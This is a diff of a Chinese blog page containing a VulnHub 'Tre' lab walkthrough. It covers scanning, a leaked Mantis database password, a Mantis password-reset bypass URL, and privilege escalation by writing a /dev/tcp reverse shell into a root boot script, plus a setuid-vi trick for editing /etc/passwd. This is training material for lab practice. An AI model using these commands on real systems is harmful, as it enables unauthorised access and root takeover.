@@ -111,30 +111,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/08/27%20Vulnhub%20Tre%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/08/27%20Vulnhub%20Tre%20Writeup/&text=27 Vulnhub Tre Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/08/27%20Vulnhub%20Tre%20Writeup/&title=27 Vulnhub Tre Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/08/27%20Vulnhub%20Tre%20Writeup/&is_video=false&description=27 Vulnhub Tre Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=27 Vulnhub Tre Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/08/27%20Vulnhub%20Tre%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/08/27%20Vulnhub%20Tre%20Writeup/&title=27 Vulnhub Tre Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/08/27%20Vulnhub%20Tre%20Writeup/&title=27 Vulnhub Tre Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/08/27%20Vulnhub%20Tre%20Writeup/&title=27 Vulnhub Tre Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/08/27%20Vulnhub%20Tre%20Writeup/&title=27 Vulnhub Tre Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/08/27%20Vulnhub%20Tre%20Writeup/&name=27 Vulnhub Tre Writeup&description=&lt;p&gt;该靶机难度中等。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/08/27%20Vulnhub%20Tre%20Writeup/&t=27 Vulnhub Tre Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1. 方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.3.2. 方法2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%953"><span class="toc-number">2.3.3.</span> <span class="toc-text">2.3.3. 方法3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span class="toc-number">3.</span> <span class="toc-text">3. 番外</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">4. 总结</span></a></li></ol>
     </div>
@@ -161,8 +143,6 @@
     <div class="postdate">
       
         <time datetime="2022-05-07T16:00:00.000Z" itemprop="datePublished">2022-05-08</time>
-        
-        (Updated: <time datetime="2022-05-07T23:53:08.143Z" itemprop="dateModified">2022-05-08</time>)
         
       
     </div>
@@ -215,27 +195,20 @@
 </ul>
 <h1 id="渗透">2. 渗透</h1>
 <h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
-<span class="token function">sudo</span> nmap -p- <span class="token number">192.168</span>.100.23
-<span class="token function">sudo</span> nmap -p22,80,8082 -A <span class="token number">192.168</span>.100.23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.100.23</span><br><span class="line">sudo nmap -p22,80,8082 -A 192.168.100.23</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507224231.png" /></p>
 <h2 id="访问http服务">2.2. 访问http服务</h2>
-<p>经尝试，80端口和8082端口的内容是一样的，都很干净，源码也没有有用的信息。那么接下来进行路径扫描 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch -u http://192.168.100.23/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>经尝试，80端口和8082端口的内容是一样的，都很干净，源码也没有有用的信息。那么接下来进行路径扫描 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.100.23/</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507224429.png" /></p>
 <p>首先打开了adminer.php，这看过去像是数据库管理后台，但是我们现在还未获得任何和数据库有关的信息，所以先放着。我也尝试搜索了以下adminer的漏洞，但靶机所使用的版本比较新，并没有可以利用的漏洞。</p>
 <p>接下来看了一下system目录，从401可以看出需要进行认证，但好在存在弱口令，admin:admin 即可绕过。</p>
-<p>进入之后，这还是一个登录界面，这里就没有弱口令了。接下来对system这个路径接着扫描： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch -u http://192.168.100.23/system --header<span class="token operator">=</span><span class="token string">"Authorization"</span><span class="token builtin class-name">:</span><span class="token string">"Basic Authorization: Basic YWRtaW46YWRtaW4="</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>进入之后，这还是一个登录界面，这里就没有弱口令了。接下来对system这个路径接着扫描： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.100.23/system --header=<span class="string">&quot;Authorization&quot;</span>:<span class="string">&quot;Basic Authorization: Basic YWRtaW46YWRtaW4=&quot;</span></span><br></pre></td></tr></table></figure></p>
 <p>请求头的信息可以从抓包看到</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507225055.png" /></p>
 <p>将其base64解码就是 admin:admin</p>
-<p>这回扫出了很多东西，尤其看到config的时候，直接访问该目录，有一个文档文件，重要内容如下： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt"># --- Database Configuration ---
-$g_hostname      = 'localhost';
-$g_db_username   = 'mantissuser';
-$g_db_password   = 'password@123AS';
-$g_database_name = 'mantis';
-$g_db_type       = 'mysqli';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>这回扫出了很多东西，尤其看到config的时候，直接访问该目录，有一个文档文件，重要内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># --- Database Configuration ---</span><br><span class="line">$g_hostname      = &#x27;localhost&#x27;;</span><br><span class="line">$g_db_username   = &#x27;mantissuser&#x27;;</span><br><span class="line">$g_db_password   = &#x27;password@123AS&#x27;;</span><br><span class="line">$g_database_name = &#x27;mantis&#x27;;</span><br><span class="line">$g_db_type       = &#x27;mysqli&#x27;;</span><br></pre></td></tr></table></figure></p>
 <p>这是数据库的相关信息。</p>
-<p>其实使用下面的命令，不用添加认证信息都可以扫出来config <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.100.23/ /usr/share/wordlists/dirb/big.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>其实使用下面的命令，不用添加认证信息都可以扫出来config <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.100.23/ /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure></p>
 <h2 id="get-shell">2.3. get shell</h2>
 <h3 id="方法1">2.3.1. 方法1</h3>
 <p>搜索 mantis 的漏洞</p>
@@ -247,7 +220,7 @@ $g_db_type       = 'mysqli';<span aria-hidden="true" class="line-numbers-rows"><
 <p>执行虽然报错了，但是已经反弹会shell了</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508074746.png" /></p>
 <h3 id="方法2">2.3.2. 方法2</h3>
-<p>利用 mantis 的 Password Reset 漏洞。简单来说就是在mantis的verify.php界面如果带上 <code>?id=1&amp;confirm_hash=</code>，就可以不用登录直接跳到administrator修改用户信息的界面 <pre class="line-numbers language-url" data-language="url"><code class="language-url">http:&#x2F;&#x2F;192.168.100.23&#x2F;system&#x2F;verify.php?id&#x3D;1&amp;confirm_hash&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>利用 mantis 的 Password Reset 漏洞。简单来说就是在mantis的verify.php界面如果带上 <code>?id=1&amp;confirm_hash=</code>，就可以不用登录直接跳到administrator修改用户信息的界面 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.23/system/verify.php?id=1&amp;confirm_hash=</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507233355.png" /></p>
 <p>修改完密码直接登录即可，注意用户名是administrator，不是XiBejMub，这个是realname。</p>
 <p>然后从Manage Users中看到了如下消息</p>
@@ -260,38 +233,20 @@ $g_db_type       = 'mysqli';<span aria-hidden="true" class="line-numbers-rows"><
 <p>红色方框不像是一个realname，猜测可能是密码，直接使用ssh连接</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507230928.png" /></p>
 <h2 id="权限提升">2.4. 权限提升</h2>
-<p>在查看sudo -l的时候发现可以不用密码执行shutdown，也就是关机的命令。接下来找可以的文件，其实也可以找进程： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -type f -perm -o<span class="token operator">=</span>w -user root -ls <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token operator">|</span><span class="token function">grep</span> -v proc<span class="token operator">|</span><span class="token function">grep</span> -v /sys/fs/cgroup
-
-<span class="token function">ps</span> -aux<span class="token operator">|</span><span class="token function">grep</span> root <span class="token comment"># 这也可以</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
-<p>找到一个可疑的文件 /usr/bin/check-system，文件内容如下： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">DATE=`date '+%Y-%m-%d %H:%M:%S'`
-echo "Service started at $&#123;DATE&#125;" | systemd-cat -p info
-
-while :
-do
-echo "Checking...";
-sleep 1;
-done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
-<p>那么这个进程是什么时候被执行的呢？ <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> -Ri <span class="token string">"check-system"</span> /etc <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>在查看sudo -l的时候发现可以不用密码执行shutdown，也就是关机的命令。接下来找可以的文件，其实也可以找进程： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm -o=w -user root -ls 2&gt;/dev/null|grep -v proc|grep -v /sys/fs/cgroup</span><br><span class="line"></span><br><span class="line">ps -aux|grep root <span class="comment"># 这也可以</span></span><br></pre></td></tr></table></figure></p>
+<p>找到一个可疑的文件 /usr/bin/check-system，文件内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DATE=`date &#x27;+%Y-%m-%d %H:%M:%S&#x27;`</span><br><span class="line">echo &quot;Service started at $&#123;DATE&#125;&quot; | systemd-cat -p info</span><br><span class="line"></span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">echo &quot;Checking...&quot;;</span><br><span class="line">sleep 1;</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
+<p>那么这个进程是什么时候被执行的呢？ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -Ri <span class="string">&quot;check-system&quot;</span> /etc 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507231843.png" /></p>
 <p>从中可以看到操作系统启动的时候就会执行check-system，配合刚刚sudo -l发现的shutdown指令，思路就很清晰了。</p>
-<p>首先往里面编写反弹shell的指令： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">DATE</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">date</span> <span class="token string">'+%Y-%m-%d %H:%M:%S'</span><span class="token variable">`</span></span>
-<span class="token builtin class-name">echo</span> <span class="token string">"Service started at <span class="token variable">$&#123;DATE&#125;</span>"</span> <span class="token operator">|</span> systemd-cat -p info
-
-<span class="token keyword">while</span> <span class="token builtin class-name">:</span>
-<span class="token keyword">do</span>
-<span class="token builtin class-name">echo</span> <span class="token string">"Checking..."</span><span class="token punctuation">;</span>
-<span class="token function">sleep</span> <span class="token number">1</span><span class="token punctuation">;</span>
-/bin/bash -i <span class="token operator">>&amp;</span> /dev/tcp/192.168.100.10/5555 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token punctuation">;</span>
-<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>首先往里面编写反弹shell的指令： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DATE=`date <span class="string">&#x27;+%Y-%m-%d %H:%M:%S&#x27;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Service started at <span class="variable">$&#123;DATE&#125;</span>&quot;</span> | systemd-cat -p info</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Checking...&quot;</span>;</span><br><span class="line">sleep 1;</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.100.10/5555 0&gt;&amp;1;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
 <p>一定要加入到循环内，否则可能会没有效果。在循环内可以每1秒执行一次，能够保证反弹shell。</p>
-<p>接着，kali监听5555端口 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvnp <span class="token number">5555</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>最后，执行重启 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /sbin/shutdown -r now <span class="token comment"># -r: 重启 now: 立刻</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>接着，kali监听5555端口 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 5555</span><br></pre></td></tr></table></figure></p>
+<p>最后，执行重启 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /sbin/shutdown -r now <span class="comment"># -r: 重启 now: 立刻</span></span><br></pre></td></tr></table></figure></p>
 <p>等待一段时间之后</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507232533.png" /></p>
-<p>接下来就可以读取flag了。 <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">/root/root.txt
-&#123;SunCSR_Tr3_Viet_Nam_2020&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>接下来就可以读取flag了。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/root/root.txt</span><br><span class="line">&#123;SunCSR_Tr3_Viet_Nam_2020&#125;</span><br></pre></td></tr></table></figure></p>
 <h1 id="番外">3. 番外</h1>
-<p>权限提升的时候，利用方式可以很多样。比如还可以往循环内写入： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +s /usr/bin/vi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>权限提升的时候，利用方式可以很多样。比如还可以往循环内写入： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +s /usr/bin/vi</span><br></pre></td></tr></table></figure></p>
 <p>然后重启。再次利用ssh登录，此时vi就获得了suid，而vi属主一般都是root，因此，就可以利用vi去修改/etc/passwd，不论是修改root密码，还是新建用户，按道理都是可以的，不过我尝试之后失败了。不过有人成功了。（疑问：添加了一个用户或者将root的密码那里去掉，亦或者修改root的密码都不行，不知道为什么）</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/tre1-vulnhub-walkthrough/">Tre:1 Vulnhub Walkthrough - Hacking Articles</a></li>
@@ -359,7 +314,6 @@ done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
